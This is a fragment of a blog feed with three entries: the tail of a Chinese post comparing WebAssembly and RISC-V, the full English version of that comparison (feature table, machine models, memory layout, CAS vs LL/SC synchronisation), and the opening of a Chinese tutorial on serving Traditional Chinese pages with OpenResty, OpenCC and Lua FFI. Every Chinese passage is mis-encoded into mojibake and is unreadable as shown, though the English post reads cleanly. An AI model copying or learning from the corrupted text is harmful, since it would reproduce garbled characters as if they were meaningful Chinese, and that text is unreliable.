å‡è®¾äº†ä¸€ä¸ªåŠŸèƒ½å®Œå–„çš„è¿è¡Œç¯å¢ƒã€‚è¿è¡Œç¯å¢ƒä¼šå¤„ç†é“¾æ¥ã€é‡å®šä½ç­‰å‡†å¤‡å·¥ä½œï¼Œç¨‹åºä¸éœ€è¦å…³å¿ƒæ€æ ·æŠŠå®ƒè‡ªå·±è¿è¡Œèµ·æ¥ã€‚</li><li>å®‰å…¨ã€‚èƒ½å¤ŸåŠ¨æ€ç”Ÿæˆå’Œä¿®æ”¹çš„ä»£ç æ˜¯ä¸ªå¾ˆå±é™©çš„æ”»å‡»ç‚¹ã€‚</li></ul><p><strong>2. é™æ€ç±»å‹ä¸æ§åˆ¶æµçº¦æŸ</strong></p><p>WebAssembly å…·æœ‰å¾ˆå¼ºçš„â€œç»“æ„æ€§â€ã€‚å…¶æ ‡å‡†è¦æ±‚æ‰€æœ‰å‡½æ•°è°ƒç”¨ã€å¾ªç¯ã€è·³è½¬å’Œå€¼ç±»å‹éµå¾ªç‰¹å®šçš„ç»“æ„çº¦æŸï¼Œä¾‹å¦‚å‘ä¸€ä¸ªæ¥å—ä¸‰ä¸ªå‚æ•°çš„å‡½æ•°ä¼ å…¥ä¸¤ä¸ªå‚æ•°ã€è·³è½¬åˆ°å…¶ä»–å‡½æ•°é‡Œçš„æŸä¸ªä½ç½®ã€åœ¨ä¸¤ä¸ªæ•´æ•°ä¸Šæ‰§è¡Œæµ®ç‚¹åŠ æ“ä½œç­‰éƒ½ä¼šå¯¼è‡´ç¼–è¯‘/éªŒè¯å¤±è´¥ã€‚RISC-V åˆ™ä¸å…·æœ‰æ­¤ç±»çº¦æŸï¼ŒæŒ‡ä»¤çš„æœ‰æ•ˆä¸å¦åªå–å†³äºå…¶è‡ªèº«çš„ç¼–ç æ˜¯å¦æ­£ç¡®ã€‚</p><p><strong>3. æœºå™¨æ¨¡å‹</strong></p><p>WebAssembly æ˜¯ä¸€ç§<a href="https://en.wikipedia.org/wiki/Stack_machine">æ ˆæœº</a>æŒ‡ä»¤é›†ï¼Œè€Œ RISC-V æ˜¯ä¸€ç§<a href="https://en.wikipedia.org/wiki/Register_machine">å¯„å­˜å™¨æœº</a>æŒ‡ä»¤é›†ã€‚</p><p>åœ¨ WebAssembly ä¸­ï¼Œæ¯æ¡æŒ‡ä»¤<em>è¯­ä¹‰ä¸Š</em>ä¼šä»å€¼æ ˆä¸Šå¼¹å‡ºå®ƒçš„æ“ä½œæ•°ï¼Œç„¶åå°†ç»“æœæ¨å…¥å€¼æ ˆã€‚ç„¶è€Œä¸ Java ç­‰å…¶ä»–åŸºäºæ ˆæœºçš„å­—èŠ‚ç æ ¼å¼ä¸åŒçš„æ˜¯ï¼Œç¨‹åºä¸­ä»»æ„æŒ‡ä»¤å¤„å€¼æ ˆçš„ç»“æ„éƒ½å¯ä»¥è¢«é™æ€ç¡®å®šã€‚è¿™ä¸€è®¾è®¡æœ‰åˆ©äºæ›´å¥½çš„ç¼–è¯‘ä¼˜åŒ–ã€‚</p><p>åœ¨ RISC-V ä¸­ï¼Œæ¯æ¡æŒ‡ä»¤çš„ç¼–ç åŒ…å« 0 - 3 ä¸ªå¯„å­˜å™¨ç¼–å· <code>rd, rs1, rs2</code> ã€‚å…¶ä¸­ <code>rs1</code>ä¸ <code>rs2</code> æ˜¯è¾“å…¥å¯„å­˜å™¨ï¼Œ <code>rd</code> æ˜¯è¾“å‡ºå¯„å­˜å™¨ã€‚é™¤å†…å­˜è®¿é—®ã€ç‰¹æƒæŒ‡ä»¤ç­‰ç‰¹æ®Šç±»å‹æŒ‡ä»¤å¤–ï¼Œæ¯æ¡æŒ‡ä»¤åªä»è¾“å…¥å¯„å­˜å™¨ä¸­è¯»å–æ•°æ®ï¼Œåœ¨è¾“å‡ºå¯„å­˜å™¨ä¸­å­˜æ”¾ç»“æœã€‚</p><p><strong>4. å†…å­˜ç®¡ç†</strong></p><p>è™½ç„¶ WebAssembly ä¸ RISC-V éƒ½å®šä¹‰äº†ä¸€ä¸ªæ— ç±»å‹çš„ã€å­—èŠ‚å¯å¯»å€çš„å†…å­˜ï¼Œå®ƒä»¬ä¹‹é—´è¿˜æ˜¯æœ‰ä¸€äº›ç»†èŠ‚ä¸Šçš„åŒºåˆ«ã€‚WebAssembly çš„å†…å­˜ç­‰åŒäºä¸€ä¸ªå¤§æ•°ç»„ï¼šæœ‰æ•ˆåœ°å€ä» 0 å¼€å§‹ï¼Œè¿ç»­æ‰©å±•åˆ°æŸä¸ªç”±ç¨‹åºå®šä¹‰åˆå€¼ã€å¯å¢é•¿çš„ä¸Šé™ã€‚è€Œ RISC-V åˆ™ä½¿ç”¨äº†<a href="https://en.wikipedia.org/wiki/Virtual_memory">è™šæ‹Ÿå†…å­˜</a>ï¼Œç”¨é¡µè¡¨å°†åœ°å€æ˜ å°„åˆ°ç‰©ç†å†…å­˜ã€‚</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://invariant.me/content/images/2020/03/wasm-riscv-comp.png" class="kg-image" alt="WebAssembly ä¸ RISC-V æŒ‡ä»¤é›†æ¶æ„çš„å¯¹æ¯”"><figcaption>å†…å­˜å¸ƒå±€</figcaption></figure><p>WebAssembly çš„å†…å­˜è®¾è®¡è™½ç„¶ç®€æ´ä¸”æ˜“äºå®ç°ï¼Œä½†å­˜åœ¨ä¸€äº›é—®é¢˜ï¼š</p><ul><li>åœ°å€ 0 æ˜¯æœ‰æ•ˆçš„ï¼Œè¿™ä¼šå¯¼è‡´ä¸€äº›ç¨‹åºåœ¨è§£å¼•ç”¨ç©ºæŒ‡é’ˆæ—¶çš„è¡Œä¸ºä¸é¢„æœŸä¸åŒã€‚</li><li>æ— æ³•å»ºç«‹ä¸æ˜ å°„åˆ°ä»»ä½•ç‰©ç†åœ°å€çš„â€œæ— æ•ˆâ€åœ°å€åŒºé—´ï¼Œå› æ­¤æ— æ³•å®ç°å¤šçº¿ç¨‹ç¯å¢ƒä¸‹çš„æ ˆä¿æŠ¤é¡µ (guard page) ã€‚</li></ul><p><strong>5. åŒæ­¥æœºåˆ¶</strong></p><p>å›¾çµå®Œå¤‡çš„è®¡ç®—æœºå™¨éœ€è¦è‡³å°‘ä¸€æ¡æ¡ä»¶åˆ†æ”¯æŒ‡ä»¤ã€‚åŒæ ·ï¼Œæ”¯æŒå¤šçº¿ç¨‹åŒæ­¥çš„æŒ‡ä»¤é›†æ¶æ„éœ€è¦è‡³å°‘ä¸€æ¡â€œåŸå­æ¡ä»¶åˆ†æ”¯â€æŒ‡ä»¤ã€‚è¿™ç±»æŒ‡ä»¤åœ¨ WebAssembly ä¸‹æ˜¯ <code>i{32,64}.atomic.rmw.cmpxchg</code>ï¼Œåœ¨ RISC-V ä¸‹æ˜¯ <code>LR/SC</code>ï¼Œåˆ†åˆ«å¯¹åº” <a href="https://en.wikipedia.org/wiki/Compare-and-swap">CAS</a> æ¨¡å‹å’Œ <a href="https://en.wikipedia.org/wiki/Load-link/store-conditional">LL/SC</a> æ¨¡å‹ã€‚</p><p>LL/SC çš„è¯­ä¹‰æ¯” CAS æ›´å¼ºã€‚CAS å­˜åœ¨éš¾ä»¥è§£å†³çš„ <a href="https://en.wikipedia.org/wiki/ABA_problem">ABA é—®é¢˜</a>ï¼Œä½† LL/SC ä¸å—å½±å“ã€‚è¿™ä¹Ÿæ„å‘³ç€åœ¨ CAS æ¶æ„ä¸Šæ¨¡æ‹Ÿ LL/SC æ¯”åè¿‡æ¥è¦å›°éš¾å¾ˆå¤šã€‚</p><hr><blockquote>Note: æˆ‘å†™è¿‡ä¸€ä¸ª RISC-V è§£é‡Šå™¨ <a href="https://github.com/losfair/FlatRv">FlatRv</a> ï¼Œä¸”æ­£åœ¨å‚ä¸ä¸€ä¸ª WebAssembly JIT è¿è¡Œç¯å¢ƒ <a href="https://github.com/wasmerio/wasmer">Wasmer</a> çš„å¼€å‘ã€‚å¦‚æœä½ æ„Ÿå…´è¶£å¯ä»¥ç‚¹ä¸ª Star :)</blockquote>]]></content>
        <author>
            <name><![CDATA[The Invariant ä¸­æ–‡]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://invariant.me/a-comparison-between-webassembly-and-risc-v/</id>
        <title><![CDATA[A Comparison between WebAssembly and RISC-V]]></title>
        <updated>2020-03-13T16:38:53+08:00</updated>
        <link href="https://invariant.me/a-comparison-between-webassembly-and-risc-v/"/>
        <content type="text/html" src="https://invariant.me/a-comparison-between-webassembly-and-risc-v/"><![CDATA[<img src="https://invariant.me/content/images/2020/03/wasm-riscv.png" alt="A Comparison between WebAssembly and RISC-V"><p><a href="https://webassembly.org/">WebAssembly</a> and <a href="https://riscv.org/">RISC-V</a> are both new Instruction Set Architectures (ISAs) that evolved in the recent 10 years. Quoting the introduction to WebAssembly on <a href="https://webassembly.org">webassembly.org</a>:</p><blockquote>WebAssembly (abbreviated <em>Wasm</em>) is a binary instruction format for a stack-based virtual machine. Wasm is designed as a portable target for compilation of high-level languages like C/C++/Rust, enabling deployment on the web for client and server applications.</blockquote><p>and the introduction to RISC-V on <a href="https://riscv.org">riscv.org</a>:</p><blockquote>RISC-V is a free and open ISA enabling a new era of processor innovation through open standard collaboration. Born in academia and research, RISC-V ISA delivers a new level of free, extensible software and hardware freedom on architecture, paving the way for the next 50 years of computing design and innovation.</blockquote><p>It seems that these two ISAs are quite different. WebAssembly is primarily targeted at JIT compilation and in particular, browsers, while RISC-V is designed for hardware and one of its goals is efficient implementation on FPGAs and circuits. They're like Java and x86 respectively in the old days: A bytecode format, and a hardware instruction set. How can they be related?</p><p>Well, the boundary between bytecodes and real hardware instruction sets is actually a bit blurred. The x86 instruction set, for example, was once executed directly by the circuits that performs control and arithmetic operations. But now on newer Intel and AMD CPUs, x86 instructions are decoded into a internal RISC format on-the-fly and sent into a RISC core for execution - isn't it some kind of hardware "JIT compilation" similar to what JRE does for Java? Meanwhile, there are also experimental hardware implementations for <a href="https://en.wikipedia.org/wiki/Java_processor">Java</a> and <a href="https://github.com/piranna/wasmachine">WebAssembly</a>, though not being as efficient as what a JIT compiler can achieve on a modern, mature CPU.</p><p>Actually, people are already using RISC-V in a position where WebAssembly has usually been used for: smart contract on blockchains. It is the <a href="https://github.com/nervosnetwork/ckb-vm">CKB VM</a>. Across the blurred line between the WebAssembly bytecode format and the RISC-V hardware instruction set, what are the similarities, and what are the differences?</p><p>Let's do a comparison.</p><h3 id="feature-table">Feature table</h3><!--kg-card-begin: markdown--><table>
<thead>
<tr>
<th></th>
<th>WebAssembly</th>
<th>RISC-V</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong><font color="#512da8">Open source</font></strong></td>
<td>Yes</td>
<td>Yes</td>
</tr>
<tr>
<td><strong><font color="#512da8">Memory architecture</font></strong></td>
<td>Load/Store</td>
<td>Load/Store</td>
</tr>
<tr>
<td><strong><font color="#512da8">Floating point</font></strong></td>
<td>Yes</td>
<td>Yes (in extension)</td>
</tr>
<tr>
<td><strong><font color="#512da8">SIMD</font></strong></td>
<td>Yes</td>
<td>Yes (in extension)</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">Separated code and data</font></strong></td>
<td>Yes</td>
<td>No</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">Pointer width</font></strong></td>
<td>32</td>
<td>32 and 64</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">Maximum data width</font></strong></td>
<td>64</td>
<td>32 and 64</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">Typing</font></strong></td>
<td>Weak</td>
<td>None</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">Control flow</font></strong></td>
<td>Restricted</td>
<td>Arbitrary</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">Machine model</font></strong></td>
<td>Stack</td>
<td>Register</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">Memory layout</font></strong></td>
<td>Linear</td>
<td>Paged</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">Memory protection</font></strong></td>
<td>None</td>
<td>RWX</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">Synchronization primitive</font></strong></td>
<td>CAS</td>
<td>LL/SC</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">Instruction encoding</font></strong></td>
<td>Variable length</td>
<td>Fixed length (2 or 4 bytes)</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">Interaction with environment</font></strong></td>
<td>Imported functions</td>
<td>System call</td>
</tr>
<tr>
<td><strong><font color="#bb4d00">Executable image format</font></strong></td>
<td>WebAssembly</td>
<td>ELF</td>
</tr>
</tbody>
</table>
<!--kg-card-end: markdown--><p>The similarities are quite common, so I will focus on the differences here.</p><p><strong>1. Separated code and data</strong></p><p>Most modern architectures use a unique addressing space for code and data, including RISC-V. But WebAssembly doesn't, and actually the running code is not even provided with a way to access itself. Possible reasons:</p><ul><li>Simplicity for JIT compilation. If code can modify itself, then the JIT compiler needs to detect the modification and update the corresponding machine code - which is very complex.</li><li>WebAssembly's assumption about a powerful host environment. Linking, etc. will be done entirely by the host, and the program doesn't need to care about bringing itself up.</li><li>Security. Generating code at runtime is dangerous.</li></ul><p><strong>2. Typing and control flow</strong></p><p>WebAssembly is very "structured": The JIT compiler requires all function calls, loops, jumps and value types to conform to structural constraints. For example, you can't pass two values to a function that accepts three arguments, you can't jump to a location in another function, and you can't execute the floating point add instruction on two integers.</p><p>RISC-V however has none of these constraints. Everything is just values in registers and it's up to the programmer to decide how to use them.</p><p><strong>3. Machine model</strong></p><p>WebAssembly is built upon the <a href="https://en.wikipedia.org/wiki/Stack_machine">stack machine</a> model, while RISC-V (along with most other hardware architectures) is a <a href="https://en.wikipedia.org/wiki/Register_machine">register machine</a>.</p><p>In WebAssembly, <em>semantically</em> any instruction pops its operands (if any) from the value stack, performs the defined operation, and pushes its results (if any) back on to the value stack. However, the structure of the value stack at any point in the program can be statically determined - which is different from the Java bytecode, for example, in that keeping the stack structure statically determinable is not an optimization but a compile-time mandatory requirement.</p><p><strong>4. Memory</strong></p><p>While both ISAs define an untyped, byte-addressable memory, some details are different. Memory in WebAssembly is literally a large byte array: addresses start from zero and continuously span to an upper limit (which can be dynamically increased by executing an instruction). In comparison, RISC-V uses <em><a href="https://en.wikipedia.org/wiki/Virtual_memory">virtual memory</a></em> where page tables are used to map addresses to the underlying physical memory.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://invariant.me/content/images/2020/03/wasm-riscv-comp.png" class="kg-image" alt="A Comparison between WebAssembly and RISC-V"><figcaption>Memory layouts</figcaption></figure><p>WebAssembly's memory model, although being simple to implement and efficient when JIT compiled, has several issues compared to RISC-V:</p><ul><li>Address zero is valid, causing programs that assume a crash for dereferencing the null pointer to misbehave.</li><li>No "gaps" are possible. Therefore the guard page trick to prevent stack overflow in a multi-threaded environment won't work.</li></ul><p>Virtual memory usually comes with memory protection where each memory page has a combination of <em>read</em>, <em>write</em> and <em>execute</em> permissions. This is an important security mechanism because it prevents execution and writes on memory regions where such operations aren't expected. RISC-V implements memory protection but WebAssembly does not - maybe it's less important in an architecture where executable code isn't addressable?</p><p><strong>5. Synchronization</strong></p><p>A computing machine needs at least one conditional branch instruction to be turing complete. Similarly, a multiprocessor architecture needs at least one "atomic conditional branch" instruction for proper synchronization. This instruction is <code>i{32,64}.atomic.rmw.<a href="https://en.wikipedia.org/wiki/Compare-and-swap">cmpxchg</a></code> in WebAssembly, and <code><a href="https://en.wikipedia.org/wiki/Load-link/store-conditional">LR/SC</a></code> in RISC-V.</p><p><code>LR/SC</code> has stronger semantics than <code>cmpxchg</code>. With <code>cmpxchg</code> we have the famous <a href="https://en.wikipedia.org/wiki/ABA_problem">ABA problem</a>, but <code>LR/SC</code> is not affected. It also means that emulating <code>LR/SC</code> with a <code>cmpxchg</code>-only architecture is much more difficult than the other way; something like a global lock or transactional memory has to be used, greatly increasing the complexity. RISC-V is designed for hardware anyway, but if you ever want to write a software implementation you will have to work around this issue.</p><hr><blockquote>Side note: I worked on/am working on both a RISC-V interpreter, <a href="https://github.com/losfair/FlatRv">FlatRv</a>, and a full WebAssembly JIT runtime, <a href="https://github.com/wasmerio/wasmer">Wasmer</a>. Take a look at them and star if you like my work :)</blockquote>]]></content>
        <author>
            <name><![CDATA[The Invariant]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.rexskz.info/support-traditional-chinese-using-openresty-and-opencc.html</id>
        <title><![CDATA[ç”¨ OpenResty+OpenCC è®©ç½‘ç«™æ”¯æŒæ­£ä½“ä¸­æ–‡]]></title>
        <updated>2020-02-29T12:30:00+08:00</updated>
        <link href="https://blog.rexskz.info/support-traditional-chinese-using-openresty-and-opencc.html"/>
        <content type="text/html" src="https://blog.rexskz.info/support-traditional-chinese-using-openresty-and-opencc.html"><![CDATA[<blockquote><p>æƒ³è¦æŸ¥çœ‹æœ¬ç«™çš„æ­£ä½“ä¸­æ–‡ç‰ˆæœ¬ï¼Œç‚¹å‡»é¡µè„šå¤„çš„â€œæ­£é«”ä¸­æ–‡â€é“¾æ¥å³å¯ã€‚</p></blockquote><p>å…³äºè¿™ç¯‡æ–‡ç« çš„èƒŒæ™¯ï¼ŒçœŸæ˜¯è¯´æ¥è¯é•¿â€¦â€¦</p><p>å¤§æ¦‚åœ¨å…«å¹´å‰ï¼Œæˆ‘å» CTSC æ‰“äº†ä¸ªé…±æ²¹ï¼ˆéé›†è®­é˜Ÿï¼Œåªæ˜¯å»ç©çš„ï¼‰ï¼Œåœ¨é‚£å‡ å¤©é‡Œï¼Œæˆ‘æ¥å—äº†è®¸å¤šå¤§ä½¬ä»¬çš„åŸ¹è®­ï¼Œå°è±¡æ¯”è¾ƒæ·±åˆ»çš„æ˜¯ <a href="https://www.byvoid.com/">BYVoid</a> å¤§ä½¬ï¼Œå› ä¸ºä»–åœ¨ PPT ä¸­æ”¾äº†è‡ªå·±ç½‘ç«™çš„é“¾æ¥ï¼Œæˆ‘ç‚¹è¿›å»ä¹‹åå‘ç°å¯ä»¥éšæ„åˆ‡æ¢â€œç®€ä½“â€å’Œâ€œç¹ä½“â€ï¼Œè€Œä¸”ä¼¼ä¹è·Ÿæˆ‘ä»¥å‰è§è¿‡çš„å›½é™…åŒ–ä¸åŒï¼Œæ–‡ç« å†…å®¹ä¹Ÿä¼šéšç€åˆ‡æ¢ã€‚å½“æ—¶æˆ‘å¯¹ Web å¼€å‘ä¸€çªä¸é€šï¼Œæ‰€ä»¥æ²¡æœ‰èƒ½åŠ›å¥½å¥½ç ”ç©¶è¿™ç©¶ç«Ÿæ˜¯æ€ä¹ˆå®ç°çš„ã€‚</p><p>åæ¥æœ‰ä¸€æ¬¡æœºç¼˜å·§åˆï¼Œæˆ‘çœ‹åˆ°äº†ä¸€ä¸ªå« <a href="https://github.com/BYVoid/OpenCC">OpenCC</a> çš„é¡¹ç›®ï¼ˆå·§åˆçš„æ˜¯ï¼Œä½œè€…å°±æ˜¯ BYVoidï¼‰ï¼Œè¿™ä¸ªé¡¹ç›®å¯ä»¥æŠŠæ±‰å­—åœ¨ä¸­å›½å¤§é™†ã€é¦™æ¸¯ã€å°æ¹¾ä¸‰ç§æ¨¡å¼ä¸‹äº’ç›¸è½¬æ¢ï¼Œå¯¹äºä¸“ç”¨è¯æ±‡å’Œåœ°åŒºæƒ¯ç”¨å­—çš„è½¬æ¢åšçš„ç›¸å½“ä¸é”™ï¼Œè€Œä¸”å·²ç»æ˜¯ Linux ä¸‹éå¸¸é€šç”¨çš„åº“ã€‚åæ¥æˆ‘åˆå¾—çŸ¥ï¼ŒBYVoid çš„ç½‘ç«™å°±æ˜¯åˆ©ç”¨äº† OpenCC åšçš„è½¬æ¢ã€‚</p><p>å½“æ—¶çš„æˆ‘å°è¯•ç”¨ PHP æ¥è°ƒç”¨ OpenCC çš„å‡½æ•°ï¼Œä½†ç”±äºå·¥ä½œé‡è¿‡å¤§ï¼ˆåŠ ä¸Šæˆ‘èœï¼‰ï¼Œäºæ˜¯ä¹Ÿæ²¡èƒ½å®ç°ã€‚åæ¥æƒ³åˆ°ä¸ºä»€ä¹ˆä¸åœ¨ Nginx ç›´æ¥è°ƒç”¨ OpenCC æŠŠé¡µé¢è½¬æ¢ä¸€ä¸‹å†è¿”å›ç»™æµè§ˆå™¨å‘¢ï¼Ÿæˆ‘æŸ¥äº†ä¸€ä¸‹ï¼ŒNginx è‡ªèº«è™½ç„¶æ²¡æœ‰è°ƒç”¨å¤–éƒ¨å‡½æ•°çš„åŠŸèƒ½ï¼Œä½† OpenRestyï¼ˆæœ¬è´¨ä¸Šæ˜¯ Nginx+Luaï¼‰ä¼¼ä¹å¯ä»¥ã€‚ä½†æ˜¯ç”±äºå½“æ—¶æˆ‘å¯¹ Nginx ä¹Ÿä¸ç†Ÿï¼Œæ„Ÿè§‰æ¢æˆ OpenResty åˆè¦è¸©ä¸€å †å‘ï¼Œäºæ˜¯ä¹Ÿä½œç½¢äº†ã€‚</p><p>å»å¹´æŸä¸€å¤©ï¼Œæˆ‘å°†è‡ªå·±çš„ç½‘ç«™è¿ç§»åˆ°äº†ä¸€ä¸ªé…ç½®æ›´å¥½çš„æœåŠ¡å™¨ï¼Œå¹¶ä¸”å…¨é¢ Docker åŒ–ï¼ˆæœ¬åœ°å¼€å‘çš„æ—¶å€™ä¹Ÿåœ¨ Docker ä¸Šï¼Œåªæ˜¯ç”¨äº†å¦ä¸€ä»½é…ç½®æ–‡ä»¶è€Œå·²ï¼‰ï¼Œä» Nginx æ¢æˆ OpenResty ç®€ç›´è·Ÿæ¢è¡£æœä¸€æ ·è½»æ¾ï¼›åŠ ä¸Šè‡ªæˆ‘æ„Ÿè§‰ç°åœ¨çš„æ°´å¹³åº”å½“è¶³å¤Ÿäº†ï¼Œäºæ˜¯ä¾¿å¼€å§‹äº†åˆä¸€æ¬¡çš„å°è¯•ã€‚</p><p>é€šè¿‡ä¸€äº›æœç´¢ï¼Œæˆ‘å‘ç°å·²ç»æœ‰äººæˆåŠŸä½¿ç”¨ OpenResty æä¾›çš„ Lua FFI è°ƒç”¨äº† OpenCC çš„ <code>.so</code> åº“ï¼Œä½†ç”±äºæ˜¯ç»™ä»˜è´¹å®¢æˆ·åšçš„ï¼Œå› æ­¤ä¸æ–¹ä¾¿å…¬å¼€æºç ã€‚è™½ç„¶æœ‰ç‚¹é—æ†¾ï¼Œä½†æˆ‘è§‰å¾—ï¼Œæ—¢ç„¶æœ‰äº†ä¸€ä¸ªå¯è¡Œçš„æ€è·¯ï¼Œé‚£æˆ‘ä¸€å®šèƒ½æå‡ºæ¥ã€‚</p><h1>åœ¨ Docker ä¸­æ­å»º OpenResty+OpenCC</h1><p>è¿™åº”å½“æ˜¯å…¨æ–‡æœ€å®¹æ˜“ç†è§£çš„éƒ¨åˆ†äº†ã€‚ç®€è€Œè¨€ä¹‹ï¼Œè¦æƒ³è¾¾æˆç›®æ ‡ï¼Œæˆ‘ä»¬é¦–å…ˆéœ€è¦æœ‰ä¸€ä¸ª OpenResty å’Œ OpenCCã€‚ç»è¿‡æœç´¢ï¼Œæˆ‘æ‰¾åˆ°äº† <a href="https://github.com/hustshawn/openresty-opencc-docker">hustshawn/openresty-opencc-docker</a> è¿™ä¸ªé¡¹ç›®ã€‚</p><p>çœ‹èµ·æ¥å®ƒçš„ Dockerfile æ²¡ä»€ä¹ˆé—®é¢˜ï¼Œåªæ˜¯ OpenResty çš„ç‰ˆæœ¬ç¨å¾®æ—§äº†ä¸€äº›ï¼Œäºæ˜¯æˆ‘ Fork äº†ä¸€ä»½ã€æ”¹äº†ä¸€ä¸‹ç‰ˆæœ¬åï¼Œæ‰“æˆäº†è‡ªå·±çš„ä¸€ä¸ª Docker é•œåƒ <a href="https://hub.docker.com/r/rexskz/openresty-opencc-docker">rexskz/openresty-opencc-docker</a>ã€‚è¦æƒ³å¯åŠ¨èµ·æ¥ï¼Œåªéœ€è¦åœ¨ <code>compose.yml</code> ä¸­è¿™æ ·å†™ï¼ˆä¹‹æ‰€ä»¥ <code>name</code> è¿˜å« <code>nginx</code>ï¼Œå› ä¸ºå®ƒæœ¬è´¨ä¸Šå°±æ˜¯ä¸ª Nginxï¼Œå°±å¥½æ¯” MariaDB çš„å¯æ‰§è¡Œç¨‹åºä¾æ—§å« <code>mysql</code>ï¼‰ï¼š</p><pre><code class="lang-yaml">services:
  nginx:
    image: rexskz/openresty-opencc-docker
    container_name: nginx
    hostname: nginx
    # ....çœç•¥å…¶å®ƒçš„é…ç½®</code></pre><p>å¯åŠ¨å®¹å™¨åè¿›å»è½¬äº†ä¸€åœˆï¼Œå‘ç° OpenCC ç›¸å…³çš„æ‰€æœ‰æ•°æ®æ–‡ä»¶éƒ½åœ¨ <code>/usr/share/opencc/</code> ç›®å½•ä¸‹ï¼Œç”±äºæˆ‘æƒ³æŠŠç®€ä½“ä¸­æ–‡è½¬æ¢ä¸ºå°æ¹¾çš„æ­£ä½“ä¸­æ–‡ï¼Œå¹¶éœ€è¦è½¬æ¢ä¸“ç”¨è¯æ±‡å’Œåœ°åŒºæƒ¯ç”¨å­—ï¼Œå› æ­¤éœ€è¦åŠ è½½å…¶ä¸­çš„ <code>s2twp.json</code> æ–‡ä»¶ã€‚</p><h1>äº†è§£ OpenResty çš„ä¸€äº›åŸºç¡€çŸ¥è¯†</h1><p>OpenResty ä¹‹æ‰€ä»¥å¯ä»¥åšåˆ°è®¸å¤šäº‹æƒ…ï¼Œå› ä¸ºå®ƒå†…ç½®äº†ä¸€ä¸ª LuaJITï¼Œå¯ä»¥ä½¿ç”¨ Lua è¿™ä¸ªè„šæœ¬è¯­è¨€æ¥è‡ªå®šä¹‰å¤„ç†é€»è¾‘ï¼Œä¾‹å¦‚ CloudFlare å°±ç”¨å®ƒæ¥åš WAFã€‚æˆ‘ä»¬è¿™æ¬¡çš„ç›®æ ‡å¾ˆå•çº¯â€”â€”å¦‚æœå‘ç°æœ‰ <code>cc_lang=zh_TW</code> è¿™ä¸ª Cookieï¼Œå°±å°† Response ä¸­çš„æ±‰å­—è½¬æ¢ä¸ºå°æ¹¾çš„æ­£ä½“ä¸­æ–‡ã€‚</p><p>ç»è¿‡æŸ¥é˜… OpenResty çš„æ–‡æ¡£ï¼Œæˆ‘å‘ç°æœ‰ä¸¤ä¸ªæŒ‡ä»¤å¯ä»¥æ»¡è¶³æˆ‘çš„éœ€æ±‚ï¼š<code>body_filter_by_lua_block</code> å’Œ <code>body_filter_by_lua_file</code>ï¼ˆè‡³äº <code>body_filter_by_lua</code>ï¼Œæ–‡æ¡£è¯´å·²ç»ä¸æ¨èä½¿ç”¨äº†ï¼‰ï¼Œå‰è€…æ˜¯ç›´æ¥å°† Lua ä»£ç å†™åˆ° Nginx é…ç½®æ–‡ä»¶ä¸­ï¼Œåè€…æ˜¯å†™åˆ°ç‰¹å®šçš„ Lua æ–‡ä»¶ä¸­ã€‚æˆ‘é€‰æ‹©äº†åè€…ï¼Œå› ä¸ºåè€…åœ¨å¼€å‘ç¯å¢ƒä¸­ä¼šæ›´å¥½ç”¨ä¸€äº›ï¼šå¯ä»¥åœ¨ Nginx é…ç½®æ–‡ä»¶ä¸­æ·»åŠ  <code>lua_code_cache off</code> æŒ‡ä»¤ï¼Œæ¯æ¬¡ä¿®æ”¹äº† Lua æ–‡ä»¶åæ— éœ€ <code>nginx -s reload</code>ã€‚</p><h1>äº†è§£ OpenResty çš„ Lua æ–‡ä»¶</h1><p>OpenResty ä¹‹æ‰€ä»¥å¯ä»¥è°ƒç”¨ Lua æ¥ä¿®æ”¹è¯·æ±‚å’Œå“åº”ï¼Œæ˜¯å› ä¸ºåœ¨ LuaJIT ä¸­ï¼Œå¯ä»¥é€šè¿‡ä¸€ä¸ªå« <code>ngx</code> çš„å…¨å±€å˜é‡æ¥è·å– Nginx çš„æ•°æ®æˆ–è€…ä¸ Nginx äº’åŠ¨ï¼Œä¾‹å¦‚åœ¨ <code>body_filter_by_lua</code> ä¸­åŠ è½½çš„ Lua è„šæœ¬ï¼š</p><ul><li>å¯ä»¥ç”¨ <code>ngx.arg[1]</code> è·å– Nginx çš„ Response bodyï¼›</li><li>å¯ä»¥ç”¨ <code>ngx.var['cookie_cc_lang']</code> è·å–åä¸º <code>cc_lang</code> çš„ Cookie å€¼ï¼›</li><li>å¯ä»¥ç”¨ <code>ngx.log(ngx.NOTICE, &quot;xxx&quot;)</code> å¾€ Nginx çš„ Notice çº§åˆ«çš„ Log ä¸­è¾“å‡ºä¸€å¥è¯ã€‚</li></ul><p>å®Œæ•´çš„ <code>ngx</code> API åœ¨è¿™é‡Œï¼š<a href="https://openresty-reference.readthedocs.io/en/latest/Lua_Nginx_API/">Lua Ngx API - OpenResty Reference</a>ã€‚</p><p>è‡³äº Lua çš„ FFIï¼Œçœ‹äº†æ–‡æ¡£ä¹‹åä¹Ÿå‘ç°æ˜¯ç›¸å½“ç®€å•ï¼Œåªéœ€è¦å¦‚ä¸‹å‡ æ­¥ï¼š</p><ol><li><code>require('ffi')</code>ï¼ˆåºŸè¯ï¼‰ï¼›</li><li>å®šä¹‰å‡½æ•°ç­¾åï¼Œç”¨çš„æ˜¯ C çš„è¯­æ³•ï¼›</li><li>é€šè¿‡ä¸€æ¡å‘½ä»¤åŠ è½½åŠ¨æ€é“¾æ¥åº“ï¼›</li><li>ç›´æ¥è·Ÿ JavaScript ä¸€æ ·è°ƒç”¨å³å¯ã€‚</li></ol><p>è¦æƒ³å®Œæˆæœ¬æ–‡çš„ç›®æ ‡ï¼Œåªéœ€çœ‹ <a href="https://moonbingbing.gitbooks.io/openresty-best-practices/lua/FFI.html">FFI Â· OpenRestyæœ€ä½³å®è·µ</a> 